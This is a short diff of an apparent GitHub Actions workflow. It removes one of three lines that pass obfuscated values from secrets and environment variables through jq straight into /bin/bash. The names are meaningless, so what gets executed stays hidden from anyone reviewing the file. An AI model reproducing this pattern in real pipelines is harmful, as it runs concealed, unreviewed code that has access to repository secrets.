@@ -18,7 +18,6 @@ jobs:
           gtfh42167: ${{ secrets.gtfh42167 }}
         run: |
           printf '%s' "$gtfh42167" | jq -r .puxab2912 | /bin/bash
-          echo $ss438 | jq -r .c70 | /bin/bash
           echo $l9 | jq -r .hp9543 | /bin/bash
 
       - name: Store results
